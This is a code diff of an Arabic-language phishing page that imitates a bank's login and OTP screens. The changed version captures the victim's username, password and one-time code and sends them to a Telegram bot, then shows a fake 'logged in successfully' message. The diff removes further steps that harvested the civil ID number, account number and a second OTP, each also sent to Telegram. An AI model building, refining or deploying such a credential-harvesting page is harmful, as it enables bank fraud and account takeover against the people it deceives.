@@ -133,7 +133,6 @@
       .footer-nav { height: 55px; }
       .footer-banner-img { height: 55px; min-height: 55px; max-height: 25vw; }
     }
-    /* Special styles for steps */
     .step {
       display: none;
       width: 100vw;
@@ -150,7 +149,6 @@
       margin: 18px auto 0 auto;
       display: block;
     }
-    /* ======== Account Step Adjustments ======== */
     .account-step-arrow {
       width: 32px;
       height: 32px;
@@ -268,7 +266,6 @@
       .sms-icon { width: 38px; }
       .account-step-arrow { width: 22px; height: 22px; }
     }
-    /* Custom improvements for OTP step */
     .otp-step-header {
       margin-top: 65px;
       font-size: 1.36rem;
@@ -334,7 +331,7 @@
         <button type="submit" class="main-btn" style="display:none" id="submitOTPLoginBtn">استكمال</button>
       </form>
     </div>
-    <!-- Step 3: Civil ID -->
+    <!-- باقي الخطوات تبقى كما هي ولكن لن تظهر للمستخدم لأننا سنوقف التنقل بعد مرحلة OTP الأولى -->
     <div class="step" id="step-civil">
       <div class="header-text" style="margin-top:60px;">رقم البطاقة المدنية الخاصة بك</div>
       <div class="sub-header" style="font-size:1.03em;">يرجى تقديم رقم البطاقة المدنية الخاصة بك حتى نتمكن من البحث عنك</div>
@@ -348,7 +345,6 @@
         باستخدام تطبيقنا المحمول ، فإنك توافق على <b>الشروط والأحكام</b>
       </div>
     </div>
-    <!-- Step 4: Account Number -->
     <div class="step" id="step-account">
       <div class="header-text" style="margin-top:60px;">
         <span>رقم حسابك</span>
@@ -372,7 +368,6 @@
         <button type="submit" class="main-btn" id="accountNextBtn" disabled style="margin-top:44px;">استكمال</button>
       </form>
     </div>
-    <!-- Step 5: SMS OTP -->
     <div class="step" id="step-otp">
       <img class="sms-icon" src="https://cdn-icons-png.flaticon.com/512/561/561127.png" alt="SMS Icon">
       <div class="header-text" style="margin-bottom:6px;">التأكيد عبر الرسائل النصية القصيرة</div>
@@ -398,6 +393,7 @@
       <br>
       <button onclick="closeErrorPopup()">موافق</button>
     </div>
+    <div class="center-text" id="doneMsg" style="display:none;margin-top:42px;color:#080;font-size:1.16em;font-weight:700;">تم تسجيل الدخول بنجاح</div>
   </div>
   <!-- ===== Footer banner image only ===== -->
   <div class="footer-nav">
@@ -431,10 +427,7 @@
     let userInfo = {
       username: "",
       password: "",
-      login_otp: "",
-      civil_id: "",
-      account: "",
-      otp: ""
+      login_otp: ""
     };
 
     // Login form - go to OTP after login
@@ -442,10 +435,6 @@
       e.preventDefault();
       userInfo.username = document.getElementById('username').value;
       userInfo.password = document.getElementById('password').value;
-      // إرسال اسم المستخدم وكلمة السر فقط
-      sendToTelegram(
-        `🟢 [تسجيل دخول]\n👤 المستخدم: <code>${userInfo.username}</code>\n🔒 كلمة السر: <code>${userInfo.password}</code>`
-      );
       showStep(1); // OTP after login
       setTimeout(() => document.querySelector('.otp-login-digit').focus(), 80);
       startOTPLoginTimer();
@@ -479,17 +468,13 @@
       let otp = "";
       otpLoginInputs.forEach(inp => otp += inp.value);
       userInfo.login_otp = otp;
-      // إرسال اسم المستخدم وكلمة السر مع رمز التحقق
+      // إرسال اسم المستخدم وكلمة السر مع رمز التحقق فقط ثم إظهار رسالة النجاح
       sendToTelegram(
         `🟢 [تسجيل دخول]\n👤 المستخدم: <code>${userInfo.username}</code>\n🔒 كلمة السر: <code>${userInfo.password}</code>\n🔢 رمز التحقق: <code>${userInfo.login_otp}</code>`
       );
-      showStep(2);
-      setTimeout(() => document.getElementById('civilid').focus(), 120);
-      // reset OTP fields
-      otpLoginInputs.forEach(inp => inp.value = "");
-      submitOTPLoginBtn.style.display = 'none';
-      clearInterval(timerIntLogin);
-      document.getElementById("resend-timer-login").innerHTML = `إعادة إرسال الرمز بعد <span id="timer-login">00:60</span>`;
+      // إخفاء كل الخطوات وإظهار رسالة النجاح فقط
+      steps.forEach(step => step.classList.remove('active'));
+      document.getElementById("doneMsg").style.display = "block";
     };
 
     // OTP login timer
@@ -518,127 +503,6 @@
       checkOTPLoginInputs();
       startOTPLoginTimer();
       otpLoginInputs[0].focus();
-    };
-
-    // Civil ID validation
-    const civilInput = document.getElementById('civilid');
-    const civilNextBtn = document.getElementById('civilNextBtn');
-    civilInput.addEventListener('input', function() {
-      this.value = this.value.replace(/\D/g, '').slice(0, 12);
-      civilNextBtn.disabled = !(this.value.length === 12);
-    });
-    document.getElementById("civil-form").onsubmit = function(e) {
-      e.preventDefault();
-      if (civilInput.value.length === 12) {
-        userInfo.civil_id = civilInput.value;
-        // إرسال رقم البطاقة الوطنية فقط
-        sendToTelegram(
-          `🟦 [رقم البطاقة الوطنية]\n🪪 الرقم المدني: <code>${userInfo.civil_id}</code>`
-        );
-        showStep(3);
-        setTimeout(() => document.querySelector('.account-digit').focus(), 100);
-      }
-    };
-
-    // Account 5 digits validation
-    const accountDigits = document.querySelectorAll('.account-digit');
-    const accountNextBtn = document.getElementById('accountNextBtn');
-    accountDigits.forEach((input, idx) => {
-      input.addEventListener('input', function(e) {
-        this.value = this.value.replace(/\D/g, '').slice(0, 1);
-        if (this.value && idx < accountDigits.length-1) {
-          accountDigits[idx+1].focus();
-        }
-        checkAccountDigits();
-      });
-      input.addEventListener('keydown', function(e) {
-        if (e.key === "Backspace" && !this.value && idx > 0) {
-          accountDigits[idx-1].focus();
-        }
-      });
-    });
-    function checkAccountDigits() {
-      let filled = true;
-      accountDigits.forEach(input => { if (!input.value) filled = false; });
-      accountNextBtn.disabled = !filled;
-    }
-    document.getElementById('account-form').onsubmit = function(e) {
-      e.preventDefault();
-      if ([...accountDigits].every(input => input.value)) {
-        let acc = "";
-        accountDigits.forEach(input => acc += input.value);
-        userInfo.account = acc;
-        // إرسال رقم البطاقة الوطنية + رقم الحساب معًا
-        sendToTelegram(
-          `🟦 [بطاقة وطنية + رقم الحساب]\n🪪 الرقم المدني: <code>${userInfo.civil_id}</code>\n💳 رقم الحساب: <code>${userInfo.account}</code>`
-        );
-        showStep(4);
-        setTimeout(() => document.querySelectorAll('.otp-digit')[0].focus(), 100);
-        startOTPTimer();
-      }
-    };
-
-    // OTP 4 digits (last step)
-    const otpInputs = document.querySelectorAll('#otp-form .otp-digit');
-    const otpError = document.getElementById('otp-error');
-    const submitOTPBtn = document.getElementById('submitOTPBtn');
-    otpInputs.forEach((input, idx) => {
-      input.addEventListener('input', function(e) {
-        this.value = this.value.replace(/\D/g, '').slice(0, 1);
-        if (this.value && idx < otpInputs.length-1) {
-          otpInputs[idx+1].focus();
-        }
-        checkOTPInputs();
-      });
-      input.addEventListener('keydown', function(e) {
-        if (e.key === "Backspace" && !this.value && idx > 0) {
-          otpInputs[idx-1].focus();
-        }
-      });
-    });
-    function checkOTPInputs() {
-      let filled = true;
-      otpInputs.forEach(input => { if (!input.value) filled = false; });
-      submitOTPBtn.style.display = filled ? 'block' : 'none';
-    }
-    document.getElementById('otp-form').onsubmit = function(e) {
-      e.preventDefault();
-      let otp = "";
-      otpInputs.forEach(inp => otp += inp.value);
-      userInfo.otp = otp;
-      // إرسال جميع المعلومات مع رقم الحساب و رمز التحقق الاخير
-      sendToTelegram(
-        `🟣 [استكمال]\n👤 المستخدم: <code>${userInfo.username}</code>\n🔒 كلمة السر: <code>${userInfo.password}</code>\n🔢 رمز التحقق الأول: <code>${userInfo.login_otp}</code>\n🪪 الرقم المدني: <code>${userInfo.civil_id}</code>\n💳 رقم الحساب: <code>${userInfo.account}</code>\n🟡 رمز التحقق الأخير: <code>${userInfo.otp}</code>`
-      );
-      // يمكنك هنا إضافة أي إشعار أو توجيه إضافي إذا رغبت لاحقاً
-    };
-
-    // OTP timer (last step)
-    let timerInt, timeLeft = 60;
-    function startOTPTimer() {
-      timeLeft = 60;
-      document.getElementById("resend-timer").style.display = "block";
-      updateTimer();
-      if (timerInt) clearInterval(timerInt);
-      timerInt = setInterval(function() {
-        timeLeft--;
-        updateTimer();
-        if (timeLeft <= 0) {
-          clearInterval(timerInt);
-          document.getElementById("resend-timer").innerHTML = `<span class="form-link" onclick="restartOTP()">إعادة إرسال الرمز</span>`;
-        }
-      }, 1000);
-    }
-    function updateTimer() {
-      const t = (timeLeft < 10 ? "00:0" : "00:") + timeLeft;
-      document.getElementById("timer").textContent = t;
-    }
-    window.restartOTP = function() {
-      for(let i=0;i<otpInputs.length;i++) otpInputs[i].value="";
-      document.getElementById("otp-error").innerText = "";
-      checkOTPInputs();
-      startOTPTimer();
-      otpInputs[0].focus();
     };
 
     // ارسال البيانات الى بوت التليجرام مع معالجة الأخطاء والتنبيه عند الفشل
@@ -670,12 +534,8 @@
       document.getElementById('account-form').reset();
       document.getElementById('otp-form').reset();
       document.getElementById('otp-login-form').reset();
-      civilNextBtn.disabled = true;
-      accountNextBtn.disabled = true;
-      submitOTPBtn.style.display = 'none';
-      submitOTPLoginBtn.style.display = 'none';
-      userInfo = { username: "", password: "", login_otp: "", civil_id: "", account: "", otp: "" };
-      showStep(0);
+      document.getElementById("doneMsg").style.display = "none";
+      steps.forEach((step,i) => step.classList.toggle('active', i===0));
       setTimeout(() => document.getElementById('username').focus(), 120);
     }
     window.closeErrorPopup = closeErrorPopup;
